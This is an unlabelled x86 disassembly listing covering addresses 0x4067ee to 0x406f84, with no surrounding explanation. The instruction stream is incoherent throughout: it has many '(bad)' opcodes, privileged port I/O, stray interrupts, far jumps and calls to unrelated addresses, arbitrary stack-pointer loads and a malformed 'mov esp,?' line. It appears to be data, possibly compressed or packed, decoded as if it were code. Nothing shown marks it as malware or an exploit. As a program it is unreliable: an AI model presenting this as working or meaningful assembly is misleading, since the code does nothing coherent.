  4067ee:	push   eax
  4067ef:	sbb    cl,bl
  4067f1:	inc    esi
  4067f2:	jmp    0x2c219b4e
  4067f7:	cmp    DWORD PTR [ebp-0x3e],eax
  4067fa:	or     BYTE PTR [ecx-0x47],0x12
  4067fe:	xor    eax,0xa0e6790a
  406803:	push   ss
  406804:	mov    cl,0x75
  406806:	int3   
  406807:	jl     0x406823
  406809:	sbb    cl,BYTE PTR [eax-0x2a]
  40680c:	out    dx,al
  40680d:	fnsave [ebx+esi*2-0x77]
  406811:	xchg   edi,eax
  406812:	xor    eax,0xee2af64c
  406817:	sbb    eax,0x98a7ca39
  40681c:	jno    0x406821
  40681e:	std    
  40681f:	out    0xd8,al
  406821:	test   BYTE PTR [esi-0x2eddfbd2],bh
  406827:	out    0x1a,al
  406829:	sar    DWORD PTR [eax+0x14bea887],1
  40682f:	mov    bl,0x86
  406831:	xor    BYTE PTR [esi-0x4e],ah
  406834:	scas   eax,DWORD PTR es:[edi]
  406835:	outs   dx,DWORD PTR ds:[esi]
  406836:	dec    eax
  406837:	add    eax,0xa476d726
  40683c:	leave  
  40683d:	mov    ebp,0x840d5b54
  406842:	sti    
  406843:	imul   ebp,DWORD PTR [ecx],0xffffffd8
  406846:	mov    dh,0xb8
  406848:	out    0xd,al
  40684a:	mov    DWORD PTR [esi+0x6c],edi
  40684d:	dec    esp
  40684e:	or     eax,0x6404c0f3
  406853:	sub    ecx,DWORD PTR [esp+esi*4]
  406856:	xchg   BYTE PTR [ecx+eiz*1+0x53],ch
  40685a:	pop    esp
  40685b:	xchg   DWORD PTR [ebx],edx
  40685d:	aam    0x93
  40685f:	faddp  st(5),st
  406861:	jl     0x40687e
  406863:	test   eax,0xaedb068a
  406868:	fwait
  406869:	div    BYTE PTR [esi-0x1f]
  40686c:	rcr    BYTE PTR [eax-0x5489b6ed],1
  406872:	jo     0x406807
  406874:	inc    eax
  406875:	out    dx,al
  406876:	nop
  406877:	jp     0x406837
  406879:	popf   
  40687a:	jmp    0x6fc2cecb
  40687f:	arpl   WORD PTR [edi-0x36],di
  406882:	pop    edi
  406883:	pop    ecx
  406884:	mov    eax,ds:0x640c3f9
  406889:	sub    eax,DWORD PTR [esi+0x7a651e70]
  40688f:	jnp    0x4068f0
  406891:	sub    cl,BYTE PTR [edi]
  406893:	imul   ecx,DWORD PTR cs:[esi-0x57],0xffffffe3
  406898:	xchg   ebp,eax
  406899:	sbb    BYTE PTR [esi-0x274b4ab0],ch
  40689f:	pop    ebx
  4068a0:	shl    DWORD PTR [ebx-0x534ac7f8],cl
  4068a6:	pop    ebp
  4068a7:	pop    ss
  4068a8:	scas   eax,DWORD PTR es:[edi]
  4068a9:	sbb    DWORD PTR ds:0x305d100e,0xb36b6477
  4068b3:	inc    ecx
  4068b4:	inc    esi
  4068b5:	push   esi
  4068b6:	mov    ds:0x70c9e380,eax
  4068bb:	xchg   esi,eax
  4068bc:	int    0x4b
  4068be:	loope  0x40688d
  4068c0:	gs lahf 
  4068c2:	xor    DWORD PTR [ecx+ebp*8-0x4e],eax
  4068c6:	mov    dh,0x7f
  4068c8:	mov    esp,0xe11eafce
  4068cd:	mov    esp,?
  4068cf:	mov    ebp,0x94280631
  4068d4:	je     0x4068e0
  4068d6:	lods   eax,DWORD PTR ds:[esi]
  4068d7:	aaa    
  4068d8:	loope  0x40688d
  4068da:	dec    ebx
  4068db:	addr16 out dx,al
  4068dd:	dec    edi
  4068de:	cmp    BYTE PTR [ecx+0x1828241e],ch
  4068e4:	mov    bl,BYTE PTR [eax]
  4068e6:	push   cs
  4068e7:	and    dh,bh
  4068e9:	xlat   BYTE PTR ds:[ebx]
  4068ea:	ins    BYTE PTR es:[edi],dx
  4068eb:	lods   eax,DWORD PTR ds:[esi]
  4068ec:	test   al,0xc9
  4068ee:	and    eax,0x409970c5
  4068f3:	and    eax,0xdbefafe5
  4068f8:	xor    dh,BYTE PTR [eax+esi*8+0x65]
  4068fc:	push   esp
  4068fd:	shl    esp,0x5f
  406900:	js     0x406883
  406902:	inc    ebx
  406903:	scas   eax,DWORD PTR es:[edi]
  406904:	fstp   DWORD PTR [esi]
  406906:	std    
  406907:	inc    eax
  406908:	jo     0x406905
  40690a:	mov    edi,0x65b0aeb4
  40690f:	jmp    0x1572:0xad4d5f5c
  406916:	xchg   eax,ebp
  406918:	jecxz  0x40691b
  40691a:	xor    ah,BYTE PTR [ebp+0x7c]
  40691d:	data16 loopne 0x4068e1
  406920:	rol    BYTE PTR [edx],1
  406922:	mov    WORD PTR [ebp-0x10],ss
  406925:	retf   
  406926:	inc    edi
  406927:	aam    0xb2
  406929:	mov    eax,0x68e24a4a
  40692e:	jne    0x4068db
  406930:	mov    esp,0x8b0c27a
  406935:	jp     0x4068b7
  406937:	out    0x3f,al
  406939:	dec    ecx
  40693a:	adc    BYTE PTR [esi-0x1ad6cb03],dh
  406940:	mov    DWORD PTR [eax-0x69532f1e],edx
  406946:	mov    esi,0x1b4aa730
  40694b:	loopne 0x406946
  40694d:	std    
  40694e:	enter  0x2776,0xd1
  406952:	mov    al,ds:0x524df0fb
  406957:	mov    eax,DWORD PTR [esi-0x65]
  40695a:	lea    edi,[edi]
  40695c:	fwait
  40695d:	out    0x9a,eax
  40695f:	or     cl,dh
  406961:	inc    eax
  406962:	cld    
  406963:	ja     0x4069ab
  406965:	push   ebx
  406967:	mov    esp,0x7e8441bd
  40696c:	scas   al,BYTE PTR es:[edi]
  40696d:	sbb    edi,DWORD PTR [ebp+0x7718b75e]
  406973:	mov    dl,0x76
  406975:	test   al,0xbf
  406977:	popf   
  406978:	fild   WORD PTR [ecx]
  40697a:	outs   dx,BYTE PTR ds:[esi]
  40697b:	add    BYTE PTR [edi-0x24],bh
  40697e:	std    
  40697f:	clc    
  406980:	push   ebp
  406981:	rcr    ah,1
  406983:	ins    BYTE PTR es:[edi],dx
  406984:	(bad)
  406988:	adc    DWORD PTR [edx],esp
  40698a:	push   0xd2aa9b71
  40698f:	jb     0x406944
  406991:	adc    eax,0x305af92
  406996:	push   esi
  406997:	inc    esp
  406998:	mov    edx,0xd6f0143
  40699d:	ds nop
  40699f:	push   es
  4069a0:	jle    0x4069d8
  4069a2:	add    eax,0xae9166f9
  4069a7:	cmp    ah,BYTE PTR [edx-0x74e6becc]
  4069ad:	pop    ds
  4069ae:	xchg   BYTE PTR [ecx+0x68],ch
  4069b1:	repnz pop ebp
  4069b3:	shr    DWORD PTR [ebx+ecx*1],cl
  4069b6:	pushf  
  4069b7:	fs fs dec ebx
  4069ba:	stos   BYTE PTR es:[edi],al
  4069bb:	(bad)  
  4069bc:	addr16 jb 0x4069f6
  4069bf:	sub    BYTE PTR [ebx-0x1766cdea],dl
  4069c5:	jnp    0x40698c
  4069c7:	add    BYTE PTR [eax-0x2b],bl
  4069ca:	sti    
  4069cb:	mov    ecx,0x5c889f84
  4069d0:	push   ss
  4069d1:	stos   BYTE PTR es:[edi],al
  4069d2:	xchg   esp,eax
  4069d3:	in     al,dx
  4069d4:	cmc    
  4069d5:	outs   dx,DWORD PTR ds:[esi]
  4069d6:	lahf   
  4069d7:	push   0xffffffa7
  4069d9:	imul   ebx,DWORD PTR [esi+ebp*8+0x39],0xffffffad
  4069de:	xlat   BYTE PTR ds:[ebx]
  4069df:	mov    bl,0x77
  4069e1:	adc    edx,DWORD PTR [eax]
  4069e3:	sub    eax,0xf47ff287
  4069e8:	data16 xor dh,BYTE PTR [ebp-0x8]
  4069ec:	into   
  4069ed:	push   ebx
  4069ee:	rcr    BYTE PTR [edx],0x6f
  4069f1:	arpl   WORD PTR [edx-0x48],bx
  4069f4:	xchg   BYTE PTR [eax-0x6c008bda],ch
  4069fa:	fnstcw WORD PTR [ecx-0x58]
  4069fd:	loopne 0x406a4f
  4069ff:	mov    ah,BYTE PTR [ecx-0x6af9258f]
  406a05:	add    ecx,esi
  406a07:	sbb    BYTE PTR [ebp+0x1d],dl
  406a0a:	push   0x51
  406a0c:	iret   
  406a0d:	jmp    0x406a76
  406a0f:	(bad)  [edx]
  406a11:	adc    eax,0x9271737e
  406a16:	repnz and bh,BYTE PTR [edx]
  406a19:	sub    eax,0x8019c0f9
  406a1e:	aam    0xa7
  406a20:	addr16 js 0x4069a6
  406a23:	cmp    DWORD PTR [esi+0x33c3eb8],0xfffffffa
  406a2a:	ss ds stc 
  406a2d:	leave  
  406a2e:	popa   
  406a2f:	loop   0x406a11
  406a31:	ins    BYTE PTR es:[edi],dx
  406a32:	sbb    ebp,edi
  406a34:	aad    0x4b
  406a36:	in     eax,dx
  406a37:	or     eax,0x5220d191
  406a3c:	fdivr  QWORD PTR ds:0x3abc3800
  406a42:	or     al,0xff
  406a44:	fs jns 0x406a2a
  406a47:	cwde   
  406a48:	ret    
  406a49:	lock and al,0x82
  406a4c:	push   esi
  406a4d:	sbb    esp,DWORD PTR [ecx+0x4354434d]
  406a53:	xchg   BYTE PTR [ecx-0x3104901b],bl
  406a59:	inc    ebp
  406a5a:	fld    st(6)
  406a5c:	push   ebp
  406a5d:	retf   0xb8a
  406a60:	scas   eax,DWORD PTR es:[edi]
  406a61:	jecxz  0x406a65
  406a63:	imul   edi,DWORD PTR [esi-0x22],0xffffffa5
  406a67:	sub    eax,0xf37a3f21
  406a6c:	sysenter 
  406a6e:	push   es
  406a6f:	pop    ebp
  406a70:	or     BYTE PTR [ecx],dl
  406a72:	stc    
  406a73:	in     eax,0x6d
  406a75:	pop    ebp
  406a76:	adc    esi,DWORD PTR [ecx+ebx*2-0x5e]
  406a7a:	scas   eax,DWORD PTR es:[edi]
  406a7b:	loopne 0x406ac0
  406a7d:	push   ebp
  406a7e:	inc    edx
  406a7f:	push   ecx
  406a80:	adc    al,0x26
  406a82:	es push edi
  406a84:	add    esp,DWORD PTR [edi+0x603fdb51]
  406a8a:	popf   
  406a8b:	inc    edx
  406a8c:	int3   
  406a8d:	fcom   DWORD PTR [edx-0x34]
  406a90:	xlat   BYTE PTR ds:[ebx]
  406a91:	(bad)  
  406a92:	xor    BYTE PTR [edx],dh
  406a94:	pop    eax
  406a95:	push   edx
  406a96:	cdq    
  406a97:	pop    ebx
  406a98:	cmp    eax,DWORD PTR [edi-0x53a936f0]
  406a9e:	mov    edx,0xc677768a
  406aa3:	lahf   
  406aa4:	mov    edi,DWORD PTR [ecx+0x681bf73c]
  406aaa:	jmp    0xf6d2:0xbbe343d6
  406ab1:	sub    ah,BYTE PTR [ebx]
  406ab3:	and    al,cl
  406ab5:	and    dh,BYTE PTR [eax]
  406ab7:	in     al,0xc2
  406ab9:	sub    eax,0x7a878435
  406abe:	mov    bl,0xe3
  406ac0:	sbb    DWORD PTR [ecx],edx
  406ac2:	cmp    BYTE PTR [edx],dh
  406ac4:	jnp    0x406a6c
  406ac6:	add    eax,esp
  406ac8:	mov    esp,0xb7374129
  406acd:	or     al,0x2
  406acf:	sub    al,0x1e
  406ad1:	mov    gs,WORD PTR [eax-0x28cbcba3]
  406ad7:	xchg   edi,eax
  406ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad9:	cli    
  406ada:	xchg   esi,eax
  406adb:	dec    BYTE PTR [ebx+0x3d]
  406ade:	fsubrp st(1),st
  406ae0:	int    0x8e
  406ae2:	add    al,0x51
  406ae4:	xchg   ebp,eax
  406ae5:	xchg   ecx,eax
  406ae6:	scas   al,BYTE PTR es:[edi]
  406ae7:	es ret 
  406ae9:	pop    ebp
  406aea:	lock pusha 
  406aec:	jae    0x406a7d
  406aee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aef:	or     eax,0xb9b1d348
  406af4:	int    0xaa
  406af6:	pop    es
  406af7:	mov    dh,0x2e
  406af9:	xrelease mov DWORD PTR [edi],ecx
  406afc:	(bad)  
  406afd:	popa   
  406afe:	jne    0x406b54
  406b00:	push   ebp
  406b01:	es aam 0x7f
  406b04:	ror    DWORD PTR [edi-0x42f8f31f],1
  406b0a:	cmp    BYTE PTR [ebx+edi*4+0x18],cl
  406b0e:	xlat   BYTE PTR ds:[ebx]
  406b0f:	adc    bh,BYTE PTR [edx]
  406b11:	mov    ds:0x9ab967,al
  406b16:	or     eax,0x258f27c
  406b1b:	ins    DWORD PTR es:[edi],dx
  406b1c:	ds pop eax
  406b1e:	jno    0x406ae5
  406b20:	js     0x406ad3
  406b22:	cld    
  406b23:	das    
  406b24:	push   0x50
  406b26:	cmp    eax,0xe79bc463
  406b2b:	test   eax,0xab01950c
  406b30:	xchg   edx,eax
  406b31:	inc    eax
  406b32:	mov    al,ds:0x1bd572b0
  406b37:	lods   al,BYTE PTR ds:[esi]
  406b38:	xchg   DWORD PTR [esp+ebx*8-0x5e],ecx
  406b3c:	inc    edi
  406b3d:	push   eax
  406b3e:	arpl   WORD PTR [di],sp
  406b41:	adc    dh,BYTE PTR [esi]
  406b43:	ins    DWORD PTR es:[edi],dx
  406b44:	js     0x406bb5
  406b46:	cmp    edx,DWORD PTR [eax-0x6c97f73e]
  406b4c:	mov    ebp,DWORD PTR [ebx+0x7fd29aab]
  406b52:	lahf   
  406b53:	xor    eax,0x5fc5645f
  406b58:	xchg   BYTE PTR [eax],cl
  406b5a:	leave  
  406b5b:	mov    ds:0xa2bca69,eax
  406b60:	scas   al,BYTE PTR es:[edi]
  406b61:	sbb    eax,0xa35bf1ee
  406b66:	test   al,0x39
  406b69:	into   
  406b6a:	popf   
  406b6b:	xor    esp,DWORD PTR [ebx+0x12]
  406b6e:	pop    ss
  406b6f:	mov    eax,ds:0x2a581878
  406b74:	mov    ebx,0xb367be7e
  406b79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b7a:	loope  0x406bdc
  406b7c:	xor    ebx,DWORD PTR [eax+0x377efc02]
  406b82:	in     al,dx
  406b83:	add    BYTE PTR [eax],cl
  406b85:	js     0x406bf8
  406b87:	mov    cl,0x5c
  406b89:	push   esi
  406b8a:	lods   al,BYTE PTR ds:[esi]
  406b8b:	mov    bh,cl
  406b8d:	xchg   ecx,eax
  406b8e:	add    ah,dh
  406b90:	jnp    0x406bd6
  406b92:	adc    BYTE PTR [eax],ah
  406b94:	test   dh,cl
  406b96:	out    dx,eax
  406b97:	push   ds
  406b98:	push   esi
  406b99:	sti    
  406b9a:	jno    0x406bb9
  406b9c:	sti    
  406b9d:	test   eax,0x9850c755
  406ba2:	pop    ss
  406ba3:	es inc edi
  406ba5:	jmp    0xf04466cd
  406baa:	inc    esi
  406bab:	retf   
  406bac:	xchg   ecx,eax
  406bad:	sqrtps xmm7,XMMWORD PTR [edi+0x66af5456]
  406bb4:	adc    ebp,DWORD PTR [ebx+0x53dfa8d1]
  406bba:	pop    ebp
  406bbb:	in     eax,0xf8
  406bbd:	mov    bh,0xe9
  406bbf:	pop    ecx
  406bc0:	sub    eax,0x3cfed18b
  406bc5:	js     0x406c29
  406bc7:	inc    eax
  406bc8:	mul    DWORD PTR fs:[ebp-0x1d]
  406bcc:	mov    ecx,ebp
  406bce:	into   
  406bcf:	scas   eax,DWORD PTR es:[edi]
  406bd0:	inc    ebp
  406bd1:	lea    edi,[edi+0x5a]
  406bd4:	pop    ss
  406bd5:	push   esp
  406bd6:	(bad)  
  406bd7:	fdiv   QWORD PTR [ebp-0x2d]
  406bda:	aam    0xf9
  406bdc:	fwait
  406bdd:	push   edx
  406bde:	lods   eax,DWORD PTR ds:[esi]
  406bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406be0:	and    al,0xb3
  406be2:	sbb    al,0x7f
  406be4:	mov    cl,0x6e
  406be6:	popf   
  406be7:	xchg   esp,eax
  406be8:	inc    esi
  406be9:	push   ds
  406bea:	sbb    DWORD PTR [ebp+esi*2+0x3],edx
  406bee:	jecxz  0x406b71
  406bf0:	xchg   ecx,eax
  406bf1:	lods   eax,DWORD PTR ds:[esi]
  406bf2:	jp     0x406b74
  406bf4:	mov    ds,WORD PTR [eax]
  406bf6:	out    dx,eax
  406bf7:	sbb    edi,0x36
  406bfa:	loope  0x406c0f
  406bfc:	pop    esp
  406bfd:	adc    al,ch
  406bff:	adc    esp,DWORD PTR [ebp-0x58726f61]
  406c05:	imul   eax,DWORD PTR [eax],0x6a
  406c08:	sbb    bh,BYTE PTR [edx-0x5c]
  406c0b:	(bad)  
  406c0c:	xchg   edx,eax
  406c0d:	jb     0x406bdd
  406c0f:	pop    ecx
  406c10:	and    dl,BYTE PTR [ebx-0x564bea14]
  406c16:	mov    esi,0xf640cf3a
  406c1b:	push   ecx
  406c1c:	jecxz  0x406bad
  406c1e:	imul   eax,ecx,0x4c
  406c21:	ins    DWORD PTR es:[edi],dx
  406c22:	sub    esi,edi
  406c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c25:	xchg   DWORD PTR [esi],esp
  406c27:	and    al,0x5a
  406c29:	add    eax,0xff391406
  406c2e:	sub    ch,bh
  406c30:	jno    0x406c0a
  406c32:	scas   eax,DWORD PTR es:[edi]
  406c33:	test   al,0xec
  406c35:	push   edi
  406c36:	iret   
  406c37:	pop    ecx
  406c38:	mov    bh,0x8c
  406c3a:	cmp    DWORD PTR [ebx],esi
  406c3c:	test   al,0xf7
  406c3e:	push   0xffffff95
  406c40:	and    al,0x5e
  406c42:	jnp    0x406bcc
  406c44:	jne    0x406c64
  406c46:	mov    esp,0x19ccf90c
  406c4b:	shr    BYTE PTR [esi-0x2a7eed3e],0x51
  406c52:	fdivr  DWORD PTR [edx+0x717e74f0]
  406c58:	outs   dx,DWORD PTR ds:[esi]
  406c59:	push   edx
  406c5a:	cdq    
  406c5b:	jge    0x406c20
  406c5d:	push   edx
  406c5e:	and    al,0x1f
  406c60:	out    0x61,eax
  406c62:	mov    BYTE PTR [ecx],bh
  406c64:	je     0x406cd1
  406c66:	dec    esp
  406c67:	in     al,0x46
  406c69:	ds push esi
  406c6b:	adc    al,0x4b
  406c6d:	dec    esp
  406c6e:	cs jecxz 0x406c24
  406c71:	(bad)  
  406c73:	enter  0x863e,0xbc
  406c77:	inc    eax
  406c78:	mov    eax,0xc2d5eb5e
  406c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7e:	(bad)  
  406c7f:	adc    eax,ebp
  406c81:	sub    ebx,ecx
  406c83:	sub    dl,dh
  406c85:	in     eax,0x2f
  406c87:	lods   eax,DWORD PTR ds:[esi]
  406c88:	cmp    BYTE PTR [ecx-0x57cf20a6],bl
  406c8e:	ret    
  406c8f:	mov    esi,0xc657ba12
  406c94:	retf   
  406c95:	fcomp  QWORD PTR [eax+0x54]
  406c98:	push   es
  406c99:	loopne 0x406ce6
  406c9b:	lods   eax,DWORD PTR ds:[esi]
  406c9c:	test   eax,0xb9f3bab2
  406ca1:	jecxz  0x406c33
  406ca3:	adc    eax,0x5ac3d6f
  406ca8:	cmp    edi,DWORD PTR [ecx+0x6681ba52]
  406cae:	adc    eax,0x666a6b34
  406cb3:	add    BYTE PTR [ecx+0x30a5c2e0],bl
  406cb9:	mov    edx,0xfad2cb10
  406cbe:	adc    al,0xc9
  406cc0:	pop    ebx
  406cc1:	dec    eax
  406cc2:	xchg   sp,ax
  406cc4:	pop    ds
  406cc5:	mov    ds:0xb7e6bf66,al
  406cca:	aam    0x14
  406ccc:	aaa    
  406ccd:	mov    ds:0x1ac0dedc,eax
  406cd2:	xchg   ecx,eax
  406cd3:	and    BYTE PTR [ecx-0x32],dl
  406cd6:	fisubr DWORD PTR [ebx-0x43]
  406cd9:	aad    0xdf
  406cdb:	lock sbb DWORD PTR [ecx+0x5eeee6bf],esi
  406ce2:	into   
  406ce3:	add    esi,DWORD PTR [esi+edi*2]
  406ce6:	jne    0x406c87
  406ce8:	push   ds
  406ce9:	push   0xffffff94
  406ceb:	leave  
  406cec:	icebp  
  406ced:	xor    cl,al
  406cef:	outs   dx,BYTE PTR ds:[esi]
  406cf0:	jl     0x406c7d
  406cf2:	sahf   
  406cf3:	adc    bl,al
  406cf5:	(bad)  [edi]
  406cf7:	std    
  406cf8:	jo     0x406d01
  406cfa:	fmul   QWORD PTR [ebp-0x21]
  406cfd:	cmc    
  406cfe:	add    eax,0xdad06f6c
  406d03:	mov    eax,0x124d2900
  406d08:	ss clc 
  406d0a:	das    
  406d0b:	sbb    al,0x79
  406d0d:	add    DWORD PTR ds:0x19d89383,ebp
  406d13:	push   ax
  406d15:	call   0xcc2ff3ec
  406d1a:	jmp    0x406ce5
  406d1c:	mov    ds:0xdcc669c1,al
  406d21:	sub    ebp,esp
  406d23:	mov    ebp,0x4b24ee56
  406d28:	push   esi
  406d29:	xchg   ecx,eax
  406d2a:	outs   dx,DWORD PTR ds:[esi]
  406d2b:	jmp    0x406d88
  406d2d:	rcl    BYTE PTR [esp+esi*2+0x59],0xe0
  406d32:	int    0x26
  406d34:	ror    BYTE PTR [edx],1
  406d36:	fs popf 
  406d38:	(bad)  
  406d3a:	xor    esi,DWORD PTR [eax+0x209bcfdf]
  406d40:	xchg   esi,esi
  406d42:	into   
  406d43:	mov    bh,0x1b
  406d45:	outs   dx,BYTE PTR gs:[esi]
  406d47:	in     al,0xb5
  406d49:	cmp    DWORD PTR [ebx+0x77],esp
  406d4c:	lea    ebx,[esi+0x51]
  406d4f:	ret    0x8e14
  406d52:	cmp    al,BYTE PTR [eax+esi*8-0x6921d08c]
  406d59:	or     al,0x5e
  406d5b:	test   eax,0xea670732
  406d60:	and    al,0x79
  406d62:	sti    
  406d63:	(bad)  
  406d64:	mov    ds:0x24ef4443,eax
  406d69:	mov    ecx,DWORD PTR [edi-0x5a]
  406d6c:	movaps xmm4,xmm6
  406d6f:	add    eax,0x20d9552a
  406d74:	rol    BYTE PTR [esi],cl
  406d76:	lods   al,BYTE PTR ds:[esi]
  406d77:	push   ss
  406d78:	cmp    BYTE PTR [ebx+0x78],bh
  406d7b:	mov    ds:0x56d81c98,al
  406d80:	sub    BYTE PTR [ebx+0x2b],0xc
  406d84:	in     al,dx
  406d85:	out    dx,eax
  406d86:	pop    esp
  406d87:	jbe    0x406dcd
  406d89:	and    BYTE PTR [eax],dl
  406d8b:	loopne 0x406d69
  406d8d:	aas    
  406d8e:	cwde   
  406d8f:	(bad)  
  406d90:	imul   esi,DWORD PTR [esi+0x7e],0xc4aa77f4
  406d97:	push   ss
  406d98:	ins    DWORD PTR es:[edi],dx
  406d99:	das    
  406d9a:	mov    ah,0x9f
  406d9c:	mov    bh,0x7f
  406d9e:	dec    esi
  406d9f:	lods   al,BYTE PTR ds:[esi]
  406da0:	aam    0xde
  406da2:	inc    dl
  406da4:	xchg   ebx,eax
  406da5:	shr    BYTE PTR [ecx-0x15],1
  406da8:	popa   
  406da9:	push   edx
  406daa:	adc    eax,0x3858b27c
  406daf:	mov    edx,0x8514dfde
  406db4:	or     eax,0x88e8a0c6
  406db9:	mov    ah,0x85
  406dbb:	pop    esp
  406dbc:	loop   0x406d65
  406dbe:	loopne 0x406d4a
  406dc0:	dec    esi
  406dc1:	mov    esi,0xbf6fe2cc
  406dc6:	call   0xe3a527f9
  406dcb:	push   ebx
  406dcc:	mov    bl,0x12
  406dcf:	mov    ds:0x10f9cbca,al
  406dd4:	bound  ecx,QWORD PTR [esi]
  406dd6:	xchg   ebp,eax
  406dd7:	idiv   BYTE PTR [eax+0x79]
  406dda:	xchg   ebx,eax
  406ddb:	ja     0x406d91
  406ddd:	xchg   edx,eax
  406dde:	int3   
  406ddf:	fnstcw WORD PTR [ebp-0x66]
  406de2:	dec    edi
  406de3:	adc    eax,0x2ab07aef
  406de8:	sub    DWORD PTR [esi],0x48
  406deb:	push   ss
  406dec:	rol    DWORD PTR [esi-0x51c6cbc2],1
  406df2:	dec    ebp
  406df3:	mov    bh,0x53
  406df5:	pop    ecx
  406df6:	bound  ebp,QWORD PTR [esi-0x1124bb8]
  406dfc:	add    DWORD PTR [edi-0x348be816],edi
  406e02:	pop    edx
  406e03:	and    eax,0x2e97018
  406e08:	pop    edi
  406e09:	retw   
  406e0b:	jmp    0x553841dd
  406e10:	ret    
  406e11:	call   0xb50fe8a1
  406e16:	jmp    0x6356:0x44fa17c4
  406e1d:	pop    ecx
  406e1e:	xchg   edi,eax
  406e1f:	not    BYTE PTR [ecx]
  406e21:	jg     0x406ea0
  406e23:	outs   dx,BYTE PTR ds:[esi]
  406e24:	hlt    
  406e25:	pop    edx
  406e26:	sbb    BYTE PTR [esi],ch
  406e28:	pop    ecx
  406e29:	ror    DWORD PTR [ecx-0x1baadb93],cl
  406e2f:	pop    eax
  406e30:	adc    al,0x1a
  406e32:	dec    edi
  406e33:	lahf   
  406e34:	sbb    al,0x30
  406e36:	into   
  406e37:	adc    DWORD PTR [esp+esi*8+0x52],edi
  406e3b:	adc    al,0xc0
  406e3d:	outs   dx,BYTE PTR ds:[esi]
  406e3e:	inc    eax
  406e3f:	popf   
  406e40:	(bad)  
  406e41:	cld    
  406e42:	fcomp  DWORD PTR [edi]
  406e44:	and    ebp,DWORD PTR [ebx-0x3b]
  406e47:	stos   DWORD PTR es:[edi],eax
  406e48:	xchg   edi,eax
  406e49:	and    DWORD PTR [ebx-0x73],ebp
  406e4c:	js     0x406e9b
  406e4e:	mov    al,ds:0x7fcfbc1d
  406e53:	pop    ecx
  406e54:	dec    ebx
  406e55:	arpl   WORD PTR [edx-0x7f],sp
  406e58:	outs   dx,DWORD PTR ds:[esi]
  406e59:	sbb    BYTE PTR [esi],dl
  406e5b:	xchg   ebp,eax
  406e5c:	inc    ebp
  406e5d:	push   0x7d
  406e5f:	sub    DWORD PTR [eax-0x11],0x45
  406e63:	lea    edx,[ebx-0xc3c336f]
  406e69:	stos   BYTE PTR es:[edi],al
  406e6a:	test   BYTE PTR [ebx-0x36986f4d],bh
  406e70:	mov    eax,ds:0xf90e7438
  406e75:	imul   esi,DWORD PTR [edi+0x12],0xffffff9a
  406e79:	cli    
  406e7a:	call   0xfacd4135
  406e7f:	jg     0x406ea3
  406e81:	sbb    al,0xa9
  406e83:	retf   0x3b77
  406e86:	mov    dl,0x97
  406e88:	dec    ebp
  406e89:	in     eax,dx
  406e8a:	stc    
  406e8b:	idiv   DWORD PTR [edx-0x7e]
  406e8e:	(bad)  
  406e8f:	adc    eax,0xc9f91237
  406e94:	or     DWORD PTR ds:[edi],ebp
  406e97:	retf   0x84e5
  406e9a:	mov    ds:0x1282c5b7,al
  406e9f:	hlt    
  406ea0:	push   ebp
  406ea1:	fdivr  QWORD PTR [edi+0x14b9444e]
  406ea7:	push   eax
  406ea8:	cmp    DWORD PTR [ecx-0x66],0x617cc54a
  406eaf:	fidivr WORD PTR [ecx+0x36]
  406eb2:	in     al,0xfb
  406eb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406eb5:	mov    ch,0x9b
  406eb7:	ins    BYTE PTR es:[edi],dx
  406eb8:	mov    bl,0xdf
  406eba:	(bad)  
  406ebb:	ds jmp 0xf91fab62
  406ec1:	ror    BYTE PTR [eax+edx*2+0x7d],cl
  406ec5:	jmp    0x7e70:0x370f2719
  406ecc:	push   ss
  406ecd:	mov    esp,0x96a96588
  406ed2:	xor    DWORD PTR [ebx],ecx
  406ed4:	loope  0x406e77
  406ed6:	sahf   
  406ed7:	call   0x56b81dc8
  406edc:	adc    DWORD PTR [edi+0x132ba3e1],ecx
  406ee2:	mov    dl,0x7e
  406ee4:	jl     0x406eee
  406ee6:	fiadd  WORD PTR [esi-0x748ebcfe]
  406eec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406eed:	mov    ecx,0x1d2d66fd
  406ef2:	call   0x55a1198b
  406ef7:	loop   0x406ef9
  406ef9:	ins    BYTE PTR es:[edi],dx
  406efa:	arpl   WORD PTR [edi+0x2b61b584],si
  406f00:	(bad)  
  406f01:	pop    ss
  406f02:	ins    DWORD PTR es:[edi],dx
  406f03:	retf   
  406f04:	aas    
  406f05:	jge    0x406f63
  406f07:	sar    bp,cl
  406f0a:	mov    ebx,0x95794ba
  406f0f:	pop    ebp
  406f10:	fwait
  406f11:	inc    DWORD PTR [esi+0x17812c15]
  406f17:	push   ebx
  406f18:	dec    edi
  406f19:	ret    
  406f1a:	mov    ds:0x5c6f32a1,al
  406f1f:	jmp    0x406ead
  406f21:	dec    ecx
  406f22:	sub    eax,0xcbee091f
  406f27:	in     al,dx
  406f28:	push   ebp
  406f29:	adc    eax,esi
  406f2b:	cmp    al,bh
  406f2d:	enter  0x9a9e,0x91
  406f31:	cdq    
  406f32:	pushf  
  406f33:	sub    ecx,ecx
  406f35:	add    BYTE PTR [edx+0xe6a3935],ch
  406f3b:	mov    esp,0x65a5aefe
  406f40:	fxch   st(1)
  406f42:	pushf  
  406f43:	lods   al,BYTE PTR ds:[esi]
  406f44:	adc    esi,eax
  406f46:	lea    ecx,[edx]
  406f48:	cli    
  406f49:	jbe    0x406fb8
  406f4b:	rcl    BYTE PTR [eax],cl
  406f4d:	inc    ebx
  406f4e:	xor    al,0x1a
  406f50:	dec    edi
  406f51:	test   al,0x62
  406f53:	pop    esp
  406f54:	xor    al,BYTE PTR [edi]
  406f56:	les    ebp,FWORD PTR [ecx+ebp*8]
  406f59:	and    al,BYTE PTR [edx-0x3828543d]
  406f5f:	sbb    eax,0xeecd88b1
  406f64:	test   al,0xac
  406f66:	sub    eax,0x65e129d5
  406f6b:	xor    ecx,ecx
  406f6d:	out    0xc4,eax
  406f6f:	cmp    DWORD PTR [edx+0x55],edx
  406f72:	push   ebp
  406f73:	adc    bl,BYTE PTR [eax]
  406f75:	xor    DWORD PTR [edi-0x21],0xfffffffa
  406f79:	clc    
  406f7a:	cwde   
  406f7b:	aam    0xa5
  406f7d:	fldcw  WORD PTR [edx-0x1a36d55f]
  406f83:	clc    
  406f84:	fadd   DWORD PTR [edx]
